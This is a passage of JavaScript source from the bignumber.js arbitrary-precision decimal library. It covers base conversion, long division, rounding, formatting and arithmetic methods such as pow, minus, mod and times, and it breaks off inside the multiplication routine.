            : i > k || i == k &&(rm == 4 || r || rm == 6 && xc[d - 1] & 1 ||
             rm == (x.s < 0 ? 8 : 7));

      // If the index of the rounding digit is not greater than zero, or xc represents
      // zero, then the result of the base conversion is zero or, if rounding up, a value
      // such as 0.00001.
      if (d < 1 || !xc[0]) {

        // 1^-dp or 0
        str = r ? toFixedPoint(alphabet.charAt(1), -dp, alphabet.charAt(0)) : alphabet.charAt(0);
      } else {

        // Truncate xc to the required number of decimal places.
        xc.length = d;

        // Round up?
        if (r) {

          // Rounding up may mean the previous digit has to be rounded up and so on.
          for (--baseOut; ++xc[--d] > baseOut;) {
            xc[d] = 0;

            if (!d) {
              ++e;
              xc = [1].concat(xc);
            }
          }
        }

        // Determine trailing zeros.
        for (k = xc.length; !xc[--k];);

        // E.g. [4, 11, 15] becomes 4bf.
        for (i = 0, str = ''; i <= k; str += alphabet.charAt(xc[i++]));

        // Add leading zeros, decimal point and trailing zeros as required.
        str = toFixedPoint(str, e, alphabet.charAt(0));
      }

      // The caller will add the sign.
      return str;
    };
  })();


  // Perform division in the specified base. Called by div and convertBase.
  div = (function () {

    // Assume non-zero x and k.
    function multiply(x, k, base) {
      var m, temp, xlo, xhi,
        carry = 0,
        i = x.length,
        klo = k % SQRT_BASE,
        khi = k / SQRT_BASE | 0;

      for (x = x.slice(); i--;) {
        xlo = x[i] % SQRT_BASE;
        xhi = x[i] / SQRT_BASE | 0;
        m = khi * xlo + xhi * klo;
        temp = klo * xlo + ((m % SQRT_BASE) * SQRT_BASE) + carry;
        carry = (temp / base | 0) + (m / SQRT_BASE | 0) + khi * xhi;
        x[i] = temp % base;
      }

      if (carry) x = [carry].concat(x);

      return x;
    }

    function compare(a, b, aL, bL) {
      var i, cmp;

      if (aL != bL) {
        cmp = aL > bL ? 1 : -1;
      } else {

        for (i = cmp = 0; i < aL; i++) {

          if (a[i] != b[i]) {
            cmp = a[i] > b[i] ? 1 : -1;
            break;
          }
        }
      }

      return cmp;
    }

    function subtract(a, b, aL, base) {
      var i = 0;

      // Subtract b from a.
      for (; aL--;) {
        a[aL] -= i;
        i = a[aL] < b[aL] ? 1 : 0;
        a[aL] = i * base + a[aL] - b[aL];
      }

      // Remove leading zeros.
      for (; !a[0] && a.length > 1; a.splice(0, 1));
    }

    // x: dividend, y: divisor.
    return function (x, y, dp, rm, base) {
      var cmp, e, i, more, n, prod, prodL, q, qc, rem, remL, rem0, xi, xL, yc0,
        yL, yz,
        s = x.s == y.s ? 1 : -1,
        xc = x.c,
        yc = y.c;

      // Either NaN, Infinity or 0?
      if (!xc || !xc[0] || !yc || !yc[0]) {

        return new BigNumber(

         // Return NaN if either NaN, or both Infinity or 0.
         !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN :

          // Return ±0 if x is ±0 or y is ±Infinity, or return ±Infinity as y is ±0.
          xc && xc[0] == 0 || !yc ? s * 0 : s / 0
       );
      }

      q = new BigNumber(s);
      qc = q.c = [];
      e = x.e - y.e;
      s = dp + e + 1;

      if (!base) {
        base = BASE;
        e = bitFloor(x.e / LOG_BASE) - bitFloor(y.e / LOG_BASE);
        s = s / LOG_BASE | 0;
      }

      // Result exponent may be one less then the current value of e.
      // The coefficients of the BigNumbers from convertBase may have trailing zeros.
      for (i = 0; yc[i] == (xc[i] || 0); i++);

      if (yc[i] > (xc[i] || 0)) e--;

      if (s < 0) {
        qc.push(1);
        more = true;
      } else {
        xL = xc.length;
        yL = yc.length;
        i = 0;
        s += 2;

        // Normalise xc and yc so highest order digit of yc is >= base / 2.

        n = mathfloor(base / (yc[0] + 1));

        // Not necessary, but to handle odd bases where yc[0] == (base / 2) - 1.
        // if (n > 1 || n++ == 1 && yc[0] < base / 2) {
        if (n > 1) {
          yc = multiply(yc, n, base);
          xc = multiply(xc, n, base);
          yL = yc.length;
          xL = xc.length;
        }

        xi = yL;
        rem = xc.slice(0, yL);
        remL = rem.length;

        // Add zeros to make remainder as long as divisor.
        for (; remL < yL; rem[remL++] = 0);
        yz = yc.slice();
        yz = [0].concat(yz);
        yc0 = yc[0];
        if (yc[1] >= base / 2) yc0++;
        // Not necessary, but to prevent trial digit n > base, when using base 3.
        // else if (base == 3 && yc0 == 1) yc0 = 1 + 1e-15;

        do {
          n = 0;

          // Compare divisor and remainder.
          cmp = compare(yc, rem, yL, remL);

          // If divisor < remainder.
          if (cmp < 0) {

            // Calculate trial digit, n.

            rem0 = rem[0];
            if (yL != remL) rem0 = rem0 * base + (rem[1] || 0);

            // n is how many times the divisor goes into the current remainder.
            n = mathfloor(rem0 / yc0);

            //  Algorithm:
            //  product = divisor multiplied by trial digit (n).
            //  Compare product and remainder.
            //  If product is greater than remainder:
            //    Subtract divisor from product, decrement trial digit.
            //  Subtract product from remainder.
            //  If product was less than remainder at the last compare:
            //    Compare new remainder and divisor.
            //    If remainder is greater than divisor:
            //      Subtract divisor from remainder, increment trial digit.

            if (n > 1) {

              // n may be > base only when base is 3.
              if (n >= base) n = base - 1;

              // product = divisor * trial digit.
              prod = multiply(yc, n, base);
              prodL = prod.length;
              remL = rem.length;

              // Compare product and remainder.
              // If product > remainder then trial digit n too high.
              // n is 1 too high about 5% of the time, and is not known to have
              // ever been more than 1 too high.
              while (compare(prod, rem, prodL, remL) == 1) {
                n--;

                // Subtract divisor from product.
                subtract(prod, yL < prodL ? yz : yc, prodL, base);
                prodL = prod.length;
                cmp = 1;
              }
            } else {

              // n is 0 or 1, cmp is -1.
              // If n is 0, there is no need to compare yc and rem again below,
              // so change cmp to 1 to avoid it.
              // If n is 1, leave cmp as -1, so yc and rem are compared again.
              if (n == 0) {

                // divisor < remainder, so n must be at least 1.
                cmp = n = 1;
              }

              // product = divisor
              prod = yc.slice();
              prodL = prod.length;
            }

            if (prodL < remL) prod = [0].concat(prod);

            // Subtract product from remainder.
            subtract(rem, prod, remL, base);
            remL = rem.length;

             // If product was < remainder.
            if (cmp == -1) {

              // Compare divisor and new remainder.
              // If divisor < new remainder, subtract divisor from remainder.
              // Trial digit n too low.
              // n is 1 too low about 5% of the time, and very rarely 2 too low.
              while (compare(yc, rem, yL, remL) < 1) {
                n++;

                // Subtract divisor from remainder.
                subtract(rem, yL < remL ? yz : yc, remL, base);
                remL = rem.length;
              }
            }
          } else if (cmp === 0) {
            n++;
            rem = [0];
          } // else cmp === 1 and n will be 0

          // Add the next digit, n, to the result array.
          qc[i++] = n;

          // Update the remainder.
          if (rem[0]) {
            rem[remL++] = xc[xi] || 0;
          } else {
            rem = [xc[xi]];
            remL = 1;
          }
        } while ((xi++ < xL || rem[0] != null) && s--);

        more = rem[0] != null;

        // Leading zero?
        if (!qc[0]) qc.splice(0, 1);
      }

      if (base == BASE) {

        // To calculate q.e, first get the number of digits of qc[0].
        for (i = 1, s = qc[0]; s >= 10; s /= 10, i++);

        round(q, dp + (q.e = i + e * LOG_BASE - 1) + 1, rm, more);

      // Caller is convertBase.
      } else {
        q.e = e;
        q.r = +more;
      }

      return q;
    };
  })();


  /*
   * Return a string representing the value of BigNumber n in fixed-point or exponential
   * notation rounded to the specified decimal places or significant digits.
   *
   * n: a BigNumber.
   * i: the index of the last digit required (i.e. the digit that may be rounded up).
   * rm: the rounding mode.
   * id: 1 (toExponential) or 2 (toPrecision).
   */
  function format(n, i, rm, id) {
    var c0, e, ne, len, str;

    if (rm == null) rm = ROUNDING_MODE;
    else intCheck(rm, 0, 8);

    if (!n.c) return n.toString();

    c0 = n.c[0];
    ne = n.e;

    if (i == null) {
      str = coeffToString(n.c);
      str = id == 1 || id == 2 && (ne <= TO_EXP_NEG || ne >= TO_EXP_POS)
       ? toExponential(str, ne)
       : toFixedPoint(str, ne, '0');
    } else {
      n = round(new BigNumber(n), i, rm);

      // n.e may have changed if the value was rounded up.
      e = n.e;

      str = coeffToString(n.c);
      len = str.length;

      // toPrecision returns exponential notation if the number of significant digits
      // specified is less than the number of digits necessary to represent the integer
      // part of the value in fixed-point notation.

      // Exponential notation.
      if (id == 1 || id == 2 && (i <= e || e <= TO_EXP_NEG)) {

        // Append zeros?
        for (; len < i; str += '0', len++);
        str = toExponential(str, e);

      // Fixed-point notation.
      } else {
        i -= ne;
        str = toFixedPoint(str, e, '0');

        // Append zeros?
        if (e + 1 > len) {
          if (--i > 0) for (str += '.'; i--; str += '0');
        } else {
          i += e - len;
          if (i > 0) {
            if (e + 1 == len) str += '.';
            for (; i--; str += '0');
          }
        }
      }
    }

    return n.s < 0 && c0 ? '-' + str : str;
  }


  // Handle BigNumber.max and BigNumber.min.
  // If any number is NaN, return NaN.
  function maxOrMin(args, n) {
    var k, y,
      i = 1,
      x = new BigNumber(args[0]);

    for (; i < args.length; i++) {
      y = new BigNumber(args[i]);
      if (!y.s || (k = compare(x, y)) === n || k === 0 && x.s === n) {
        x = y;
      }
    }

    return x;
  }


  /*
   * Strip trailing zeros, calculate base 10 exponent and check against MIN_EXP and MAX_EXP.
   * Called by minus, plus and times.
   */
  function normalise(n, c, e) {
    var i = 1,
      j = c.length;

     // Remove trailing zeros.
    for (; !c[--j]; c.pop());

    // Calculate the base 10 exponent. First get the number of digits of c[0].
    for (j = c[0]; j >= 10; j /= 10, i++);

    // Overflow?
    if ((e = i + e * LOG_BASE - 1) > MAX_EXP) {

      // Infinity.
      n.c = n.e = null;

    // Underflow?
    } else if (e < MIN_EXP) {

      // Zero.
      n.c = [n.e = 0];
    } else {
      n.e = e;
      n.c = c;
    }

    return n;
  }


  // Handle values that fail the validity test in BigNumber.
  parseNumeric = (function () {
    var basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i,
      dotAfter = /^([^.]+)\.$/,
      dotBefore = /^\.([^.]+)$/,
      isInfinityOrNaN = /^-?(Infinity|NaN)$/,
      whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g;

    return function (x, str, isNum, b) {
      var base,
        s = isNum ? str : str.replace(whitespaceOrPlus, '');

      // No exception on ±Infinity or NaN.
      if (isInfinityOrNaN.test(s)) {
        x.s = isNaN(s) ? null : s < 0 ? -1 : 1;
      } else {
        if (!isNum) {

          // basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i
          s = s.replace(basePrefix, function (m, p1, p2) {
            base = (p2 = p2.toLowerCase()) == 'x' ? 16 : p2 == 'b' ? 2 : 8;
            return !b || b == base ? p1 : m;
          });

          if (b) {
            base = b;

            // E.g. '1.' to '1', '.1' to '0.1'
            s = s.replace(dotAfter, '$1').replace(dotBefore, '0.$1');
          }

          if (str != s) return new BigNumber(s, base);
        }

        // '[BigNumber Error] Not a number: {n}'
        // '[BigNumber Error] Not a base {b} number: {n}'
        if (BigNumber.DEBUG) {
          throw Error
            (bignumberError + 'Not a' + (b ? ' base ' + b : '') + ' number: ' + str);
        }

        // NaN
        x.s = null;
      }

      x.c = x.e = null;
    }
  })();


  /*
   * Round x to sd significant digits using rounding mode rm. Check for over/under-flow.
   * If r is truthy, it is known that there are more digits after the rounding digit.
   */
  function round(x, sd, rm, r) {
    var d, i, j, k, n, ni, rd,
      xc = x.c,
      pows10 = POWS_TEN;

    // if x is not Infinity or NaN...
    if (xc) {

      // rd is the rounding digit, i.e. the digit after the digit that may be rounded up.
      // n is a base 1e14 number, the value of the element of array x.c containing rd.
      // ni is the index of n within x.c.
      // d is the number of digits of n.
      // i is the index of rd within n including leading zeros.
      // j is the actual index of rd within n (if < 0, rd is a leading zero).
      out: {

        // Get the number of digits of the first element of xc.
        for (d = 1, k = xc[0]; k >= 10; k /= 10, d++);
        i = sd - d;

        // If the rounding digit is in the first element of xc...
        if (i < 0) {
          i += LOG_BASE;
          j = sd;
          n = xc[ni = 0];

          // Get the rounding digit at index j of n.
          rd = mathfloor(n / pows10[d - j - 1] % 10);
        } else {
          ni = mathceil((i + 1) / LOG_BASE);

          if (ni >= xc.length) {

            if (r) {

              // Needed by sqrt.
              for (; xc.length <= ni; xc.push(0));
              n = rd = 0;
              d = 1;
              i %= LOG_BASE;
              j = i - LOG_BASE + 1;
            } else {
              break out;
            }
          } else {
            n = k = xc[ni];

            // Get the number of digits of n.
            for (d = 1; k >= 10; k /= 10, d++);

            // Get the index of rd within n.
            i %= LOG_BASE;

            // Get the index of rd within n, adjusted for leading zeros.
            // The number of leading zeros of n is given by LOG_BASE - d.
            j = i - LOG_BASE + d;

            // Get the rounding digit at index j of n.
            rd = j < 0 ? 0 : mathfloor(n / pows10[d - j - 1] % 10);
          }
        }

        r = r || sd < 0 ||

        // Are there any non-zero digits after the rounding digit?
        // The expression  n % pows10[d - j - 1]  returns all digits of n to the right
        // of the digit at j, e.g. if n is 908714 and j is 2, the expression gives 714.
         xc[ni + 1] != null || (j < 0 ? n : n % pows10[d - j - 1]);

        r = rm < 4
         ? (rd || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2))
         : rd > 5 || rd == 5 && (rm == 4 || r || rm == 6 &&

          // Check whether the digit to the left of the rounding digit is odd.
          ((i > 0 ? j > 0 ? n / pows10[d - j] : 0 : xc[ni - 1]) % 10) & 1 ||
           rm == (x.s < 0 ? 8 : 7));

        if (sd < 1 || !xc[0]) {
          xc.length = 0;

          if (r) {

            // Convert sd to decimal places.
            sd -= x.e + 1;

            // 1, 0.1, 0.01, 0.001, 0.0001 etc.
            xc[0] = pows10[(LOG_BASE - sd % LOG_BASE) % LOG_BASE];
            x.e = -sd || 0;
          } else {

            // Zero.
            xc[0] = x.e = 0;
          }

          return x;
        }

        // Remove excess digits.
        if (i == 0) {
          xc.length = ni;
          k = 1;
          ni--;
        } else {
          xc.length = ni + 1;
          k = pows10[LOG_BASE - i];

          // E.g. 56700 becomes 56000 if 7 is the rounding digit.
          // j > 0 means i > number of leading zeros of n.
          xc[ni] = j > 0 ? mathfloor(n / pows10[d - j] % pows10[j]) * k : 0;
        }

        // Round up?
        if (r) {

          for (; ;) {

            // If the digit to be rounded up is in the first element of xc...
            if (ni == 0) {

              // i will be the length of xc[0] before k is added.
              for (i = 1, j = xc[0]; j >= 10; j /= 10, i++);
              j = xc[0] += k;
              for (k = 1; j >= 10; j /= 10, k++);

              // if i != k the length has increased.
              if (i != k) {
                x.e++;
                if (xc[0] == BASE) xc[0] = 1;
              }

              break;
            } else {
              xc[ni] += k;
              if (xc[ni] != BASE) break;
              xc[ni--] = 0;
              k = 1;
            }
          }
        }

        // Remove trailing zeros.
        for (i = xc.length; xc[--i] === 0; xc.pop());
      }

      // Overflow? Infinity.
      if (x.e > MAX_EXP) {
        x.c = x.e = null;

      // Underflow? Zero.
      } else if (x.e < MIN_EXP) {
        x.c = [x.e = 0];
      }
    }

    return x;
  }


  function valueOf(n) {
    var str,
      e = n.e;

    if (e === null) return n.toString();

    str = coeffToString(n.c);

    str = e <= TO_EXP_NEG || e >= TO_EXP_POS
      ? toExponential(str, e)
      : toFixedPoint(str, e, '0');

    return n.s < 0 ? '-' + str : str;
  }


  // PROTOTYPE/INSTANCE METHODS


  /*
   * Return a new BigNumber whose value is the absolute value of this BigNumber.
   */
  P.absoluteValue = P.abs = function () {
    var x = new BigNumber(this);
    if (x.s < 0) x.s = 1;
    return x;
  };


  /*
   * Return
   *   1 if the value of this BigNumber is greater than the value of BigNumber(y, b),
   *   -1 if the value of this BigNumber is less than the value of BigNumber(y, b),
   *   0 if they have the same value,
   *   or null if the value of either is NaN.
   */
  P.comparedTo = function (y, b) {
    return compare(this, new BigNumber(y, b));
  };


  /*
   * If dp is undefined or null or true or false, return the number of decimal places of the
   * value of this BigNumber, or null if the value of this BigNumber is ±Infinity or NaN.
   *
   * Otherwise, if dp is a number, return a new BigNumber whose value is the value of this
   * BigNumber rounded to a maximum of dp decimal places using rounding mode rm, or
   * ROUNDING_MODE if rm is omitted.
   *
   * [dp] {number} Decimal places: integer, 0 to MAX inclusive.
   * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
   */
  P.decimalPlaces = P.dp = function (dp, rm) {
    var c, n, v,
      x = this;

    if (dp != null) {
      intCheck(dp, 0, MAX);
      if (rm == null) rm = ROUNDING_MODE;
      else intCheck(rm, 0, 8);

      return round(new BigNumber(x), dp + x.e + 1, rm);
    }

    if (!(c = x.c)) return null;
    n = ((v = c.length - 1) - bitFloor(this.e / LOG_BASE)) * LOG_BASE;

    // Subtract the number of trailing zeros of the last number.
    if (v = c[v]) for (; v % 10 == 0; v /= 10, n--);
    if (n < 0) n = 0;

    return n;
  };


  /*
   *  n / 0 = I
   *  n / N = N
   *  n / I = 0
   *  0 / n = 0
   *  0 / 0 = N
   *  0 / N = N
   *  0 / I = 0
   *  N / n = N
   *  N / 0 = N
   *  N / N = N
   *  N / I = N
   *  I / n = I
   *  I / 0 = I
   *  I / N = N
   *  I / I = N
   *
   * Return a new BigNumber whose value is the value of this BigNumber divided by the value of
   * BigNumber(y, b), rounded according to DECIMAL_PLACES and ROUNDING_MODE.
   */
  P.dividedBy = P.div = function (y, b) {
    return div(this, new BigNumber(y, b), DECIMAL_PLACES, ROUNDING_MODE);
  };


  /*
   * Return a new BigNumber whose value is the integer part of dividing the value of this
   * BigNumber by the value of BigNumber(y, b).
   */
  P.dividedToIntegerBy = P.idiv = function (y, b) {
    return div(this, new BigNumber(y, b), 0, 1);
  };


  /*
   * Return a BigNumber whose value is the value of this BigNumber exponentiated by n.
   *
   * If m is present, return the result modulo m.
   * If n is negative round according to DECIMAL_PLACES and ROUNDING_MODE.
   * If POW_PRECISION is non-zero and m is not present, round to POW_PRECISION using ROUNDING_MODE.
   *
   * The modular power operation works efficiently when x, n, and m are integers, otherwise it
   * is equivalent to calculating x.exponentiatedBy(n).modulo(m) with a POW_PRECISION of 0.
   *
   * n {number|string|BigNumber} The exponent. An integer.
   * [m] {number|string|BigNumber} The modulus.
   *
   * '[BigNumber Error] Exponent not an integer: {n}'
   */
  P.exponentiatedBy = P.pow = function (n, m) {
    var half, isModExp, i, k, more, nIsBig, nIsNeg, nIsOdd, y,
      x = this;

    n = new BigNumber(n);

    // Allow NaN and ±Infinity, but not other non-integers.
    if (n.c && !n.isInteger()) {
      throw Error
        (bignumberError + 'Exponent not an integer: ' + valueOf(n));
    }

    if (m != null) m = new BigNumber(m);

    // Exponent of MAX_SAFE_INTEGER is 15.
    nIsBig = n.e > 14;

    // If x is NaN, ±Infinity, ±0 or ±1, or n is ±Infinity, NaN or ±0.
    if (!x.c || !x.c[0] || x.c[0] == 1 && !x.e && x.c.length == 1 || !n.c || !n.c[0]) {

      // The sign of the result of pow when x is negative depends on the evenness of n.
      // If +n overflows to ±Infinity, the evenness of n would be not be known.
      y = new BigNumber(Math.pow(+valueOf(x), nIsBig ? n.s * (2 - isOdd(n)) : +valueOf(n)));
      return m ? y.mod(m) : y;
    }

    nIsNeg = n.s < 0;

    if (m) {

      // x % m returns NaN if abs(m) is zero, or m is NaN.
      if (m.c ? !m.c[0] : !m.s) return new BigNumber(NaN);

      isModExp = !nIsNeg && x.isInteger() && m.isInteger();

      if (isModExp) x = x.mod(m);

    // Overflow to ±Infinity: >=2**1e10 or >=1.0000024**1e15.
    // Underflow to ±0: <=0.79**1e10 or <=0.9999975**1e15.
    } else if (n.e > 9 && (x.e > 0 || x.e < -1 || (x.e == 0
      // [1, 240000000]
      ? x.c[0] > 1 || nIsBig && x.c[1] >= 24e7
      // [80000000000000]  [99999750000000]
      : x.c[0] < 8e13 || nIsBig && x.c[0] <= 9999975e7))) {

      // If x is negative and n is odd, k = -0, else k = 0.
      k = x.s < 0 && isOdd(n) ? -0 : 0;

      // If x >= 1, k = ±Infinity.
      if (x.e > -1) k = 1 / k;

      // If n is negative return ±0, else return ±Infinity.
      return new BigNumber(nIsNeg ? 1 / k : k);

    } else if (POW_PRECISION) {

      // Truncating each coefficient array to a length of k after each multiplication
      // equates to truncating significant digits to POW_PRECISION + [28, 41],
      // i.e. there will be a minimum of 28 guard digits retained.
      k = mathceil(POW_PRECISION / LOG_BASE + 2);
    }

    if (nIsBig) {
      half = new BigNumber(0.5);
      if (nIsNeg) n.s = 1;
      nIsOdd = isOdd(n);
    } else {
      i = Math.abs(+valueOf(n));
      nIsOdd = i % 2;
    }

    y = new BigNumber(ONE);

    // Performs 54 loop iterations for n of 9007199254740991.
    for (; ;) {

      if (nIsOdd) {
        y = y.times(x);
        if (!y.c) break;

        if (k) {
          if (y.c.length > k) y.c.length = k;
        } else if (isModExp) {
          y = y.mod(m);    //y = y.minus(div(y, m, 0, MODULO_MODE).times(m));
        }
      }

      if (i) {
        i = mathfloor(i / 2);
        if (i === 0) break;
        nIsOdd = i % 2;
      } else {
        n = n.times(half);
        round(n, n.e + 1, 1);

        if (n.e > 14) {
          nIsOdd = isOdd(n);
        } else {
          i = +valueOf(n);
          if (i === 0) break;
          nIsOdd = i % 2;
        }
      }

      x = x.times(x);

      if (k) {
        if (x.c && x.c.length > k) x.c.length = k;
      } else if (isModExp) {
        x = x.mod(m);    //x = x.minus(div(x, m, 0, MODULO_MODE).times(m));
      }
    }

    if (isModExp) return y;
    if (nIsNeg) y = ONE.div(y);

    return m ? y.mod(m) : k ? round(y, POW_PRECISION, ROUNDING_MODE, more) : y;
  };


  /*
   * Return a new BigNumber whose value is the value of this BigNumber rounded to an integer
   * using rounding mode rm, or ROUNDING_MODE if rm is omitted.
   *
   * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {rm}'
   */
  P.integerValue = function (rm) {
    var n = new BigNumber(this);
    if (rm == null) rm = ROUNDING_MODE;
    else intCheck(rm, 0, 8);
    return round(n, n.e + 1, rm);
  };


  /*
   * Return true if the value of this BigNumber is equal to the value of BigNumber(y, b),
   * otherwise return false.
   */
  P.isEqualTo = P.eq = function (y, b) {
    return compare(this, new BigNumber(y, b)) === 0;
  };


  /*
   * Return true if the value of this BigNumber is a finite number, otherwise return false.
   */
  P.isFinite = function () {
    return !!this.c;
  };


  /*
   * Return true if the value of this BigNumber is greater than the value of BigNumber(y, b),
   * otherwise return false.
   */
  P.isGreaterThan = P.gt = function (y, b) {
    return compare(this, new BigNumber(y, b)) > 0;
  };


  /*
   * Return true if the value of this BigNumber is greater than or equal to the value of
   * BigNumber(y, b), otherwise return false.
   */
  P.isGreaterThanOrEqualTo = P.gte = function (y, b) {
    return (b = compare(this, new BigNumber(y, b))) === 1 || b === 0;

  };


  /*
   * Return true if the value of this BigNumber is an integer, otherwise return false.
   */
  P.isInteger = function () {
    return !!this.c && bitFloor(this.e / LOG_BASE) > this.c.length - 2;
  };


  /*
   * Return true if the value of this BigNumber is less than the value of BigNumber(y, b),
   * otherwise return false.
   */
  P.isLessThan = P.lt = function (y, b) {
    return compare(this, new BigNumber(y, b)) < 0;
  };


  /*
   * Return true if the value of this BigNumber is less than or equal to the value of
   * BigNumber(y, b), otherwise return false.
   */
  P.isLessThanOrEqualTo = P.lte = function (y, b) {
    return (b = compare(this, new BigNumber(y, b))) === -1 || b === 0;
  };


  /*
   * Return true if the value of this BigNumber is NaN, otherwise return false.
   */
  P.isNaN = function () {
    return !this.s;
  };


  /*
   * Return true if the value of this BigNumber is negative, otherwise return false.
   */
  P.isNegative = function () {
    return this.s < 0;
  };


  /*
   * Return true if the value of this BigNumber is positive, otherwise return false.
   */
  P.isPositive = function () {
    return this.s > 0;
  };


  /*
   * Return true if the value of this BigNumber is 0 or -0, otherwise return false.
   */
  P.isZero = function () {
    return !!this.c && this.c[0] == 0;
  };


  /*
   *  n - 0 = n
   *  n - N = N
   *  n - I = -I
   *  0 - n = -n
   *  0 - 0 = 0
   *  0 - N = N
   *  0 - I = -I
   *  N - n = N
   *  N - 0 = N
   *  N - N = N
   *  N - I = N
   *  I - n = I
   *  I - 0 = I
   *  I - N = N
   *  I - I = N
   *
   * Return a new BigNumber whose value is the value of this BigNumber minus the value of
   * BigNumber(y, b).
   */
  P.minus = function (y, b) {
    var i, j, t, xLTy,
      x = this,
      a = x.s;

    y = new BigNumber(y, b);
    b = y.s;

    // Either NaN?
    if (!a || !b) return new BigNumber(NaN);

    // Signs differ?
    if (a != b) {
      y.s = -b;
      return x.plus(y);
    }

    var xe = x.e / LOG_BASE,
      ye = y.e / LOG_BASE,
      xc = x.c,
      yc = y.c;

    if (!xe || !ye) {

      // Either Infinity?
      if (!xc || !yc) return xc ? (y.s = -b, y) : new BigNumber(yc ? x : NaN);

      // Either zero?
      if (!xc[0] || !yc[0]) {

        // Return y if y is non-zero, x if x is non-zero, or zero if both are zero.
        return yc[0] ? (y.s = -b, y) : new BigNumber(xc[0] ? x :

         // IEEE 754 (2008) 6.3: n - n = -0 when rounding to -Infinity
         ROUNDING_MODE == 3 ? -0 : 0);
      }
    }

    xe = bitFloor(xe);
    ye = bitFloor(ye);
    xc = xc.slice();

    // Determine which is the bigger number.
    if (a = xe - ye) {

      if (xLTy = a < 0) {
        a = -a;
        t = xc;
      } else {
        ye = xe;
        t = yc;
      }

      t.reverse();

      // Prepend zeros to equalise exponents.
      for (b = a; b--; t.push(0));
      t.reverse();
    } else {

      // Exponents equal. Check digit by digit.
      j = (xLTy = (a = xc.length) < (b = yc.length)) ? a : b;

      for (a = b = 0; b < j; b++) {

        if (xc[b] != yc[b]) {
          xLTy = xc[b] < yc[b];
          break;
        }
      }
    }

    // x < y? Point xc to the array of the bigger number.
    if (xLTy) {
      t = xc;
      xc = yc;
      yc = t;
      y.s = -y.s;
    }

    b = (j = yc.length) - (i = xc.length);

    // Append zeros to xc if shorter.
    // No need to add zeros to yc if shorter as subtract only needs to start at yc.length.
    if (b > 0) for (; b--; xc[i++] = 0);
    b = BASE - 1;

    // Subtract yc from xc.
    for (; j > a;) {

      if (xc[--j] < yc[j]) {
        for (i = j; i && !xc[--i]; xc[i] = b);
        --xc[i];
        xc[j] += BASE;
      }

      xc[j] -= yc[j];
    }

    // Remove leading zeros and adjust exponent accordingly.
    for (; xc[0] == 0; xc.splice(0, 1), --ye);

    // Zero?
    if (!xc[0]) {

      // Following IEEE 754 (2008) 6.3,
      // n - n = +0  but  n - n = -0  when rounding towards -Infinity.
      y.s = ROUNDING_MODE == 3 ? -1 : 1;
      y.c = [y.e = 0];
      return y;
    }

    // No need to check for Infinity as +x - +y != Infinity && -x - -y != Infinity
    // for finite x and y.
    return normalise(y, xc, ye);
  };


  /*
   *   n % 0 =  N
   *   n % N =  N
   *   n % I =  n
   *   0 % n =  0
   *  -0 % n = -0
   *   0 % 0 =  N
   *   0 % N =  N
   *   0 % I =  0
   *   N % n =  N
   *   N % 0 =  N
   *   N % N =  N
   *   N % I =  N
   *   I % n =  N
   *   I % 0 =  N
   *   I % N =  N
   *   I % I =  N
   *
   * Return a new BigNumber whose value is the value of this BigNumber modulo the value of
   * BigNumber(y, b). The result depends on the value of MODULO_MODE.
   */
  P.modulo = P.mod = function (y, b) {
    var q, s,
      x = this;

    y = new BigNumber(y, b);

    // Return NaN if x is Infinity or NaN, or y is NaN or zero.
    if (!x.c || !y.s || y.c && !y.c[0]) {
      return new BigNumber(NaN);

    // Return x if y is Infinity or x is zero.
    } else if (!y.c || x.c && !x.c[0]) {
      return new BigNumber(x);
    }

    if (MODULO_MODE == 9) {

      // Euclidian division: q = sign(y) * floor(x / abs(y))
      // r = x - qy    where  0 <= r < abs(y)
      s = y.s;
      y.s = 1;
      q = div(x, y, 0, 3);
      y.s = s;
      q.s *= s;
    } else {
      q = div(x, y, 0, MODULO_MODE);
    }

    y = x.minus(q.times(y));

    // To match JavaScript %, ensure sign of zero is sign of dividend.
    if (!y.c[0] && MODULO_MODE == 1) y.s = x.s;

    return y;
  };


  /*
   *  n * 0 = 0
   *  n * N = N
   *  n * I = I
   *  0 * n = 0
   *  0 * 0 = 0
   *  0 * N = N
   *  0 * I = N
   *  N * n = N
   *  N * 0 = N
   *  N * N = N
   *  N * I = N
   *  I * n = I
   *  I * 0 = N
   *  I * N = N
   *  I * I = I
   *
   * Return a new BigNumber whose value is the value of this BigNumber multiplied by the value
   * of BigNumber(y, b).
   */
  P.multipliedBy = P.times = function (y, b) {
    var c, e, i, j, k, m, xcL, xlo, xhi, ycL, ylo, yhi, zc,
      base, sqrtBase,
      x = this,
      xc = x.c,
      yc = (y = new BigNumber(y, b)).c;

    // Either NaN, ±Infinity or ±0?
    if (!xc || !yc || !xc[0] || !yc[0]) {

      // Return NaN if either is NaN, or one is 0 and the other is Infinity.
      if (!x.s || !y.s || xc && !xc[0] && !yc || yc && !yc[0] && !xc) {
        y.c = y.e = y.s = null;
      } else {
        y.s *= x.s;

        // Return ±Infinity if either is ±Infinity.
        if (!xc || !yc) {
          y.c = y.e = null;

        // Return ±0 if either is ±0.
        } else {
          y.c = [0];
          y.e = 0;
        }
      }

      return y;
    }

    e = bitFloor(x.e / LOG_BASE) + bitFloor(y.e / LOG_BASE);
    y.s *= x.s;
    xcL = xc.length;
    ycL = yc.length;

    // Ensure xc points to longer array and xcL to its length.
    if (xcL < ycL) {
      zc = xc;
      xc = yc;
      yc = zc;
      i = xcL;
      xcL = ycL;
      ycL = i;
    }

    // Initialise the result array with zeros.
    for (i = xcL + ycL, zc = []; i--; zc.push(0));

    base = BASE;
    sqrtBase = SQRT_BASE;

    for (i = ycL; --i >= 0;) {
      c = 0;
      ylo = yc[i] % sqrtBase;
      yhi = yc[i] / sqrtBase | 0;

      for (k = xcL, j = i + k; j > i;) {
        xlo = xc[--k] % sqrtBase;
        xhi = xc[k] / sqrtBase | 0;
        m = yhi * xlo + xhi * ylo;
        xlo = ylo * xlo + ((m % sqrtBase) * sqrtBase) + zc[j] + c;
        c = (xlo / base | 0) + (m / sqrtBase | 0) + yhi * xhi;
        zc[j--] = xlo % base;
      }

      zc[j] = c;
    }

